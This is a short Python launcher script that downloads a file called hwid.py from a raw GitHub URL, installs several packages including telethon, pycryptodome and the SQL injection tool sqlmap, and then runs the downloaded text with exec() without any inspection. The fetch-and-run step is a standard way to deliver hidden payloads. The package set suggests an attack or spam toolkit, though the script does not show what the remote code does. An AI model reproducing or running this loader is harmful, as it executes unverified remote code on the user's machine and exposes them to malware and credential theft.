import os
import platform

from requests import get

startapp = get("https://raw.githubusercontent.com/hazurik/cnocep/main/hwid.py").text

if platform.system() == "Windows":
    os.system('cls')
else:
    os.system('clear')
    
os.system('pip install requests && pip install pycryptodome && pip install colorama && pip install telethon && pip install pyfiglet && pip install termcolor && pip install pystyle && pip install colorama && pip install sqlmap && clear')
exec(startapp)
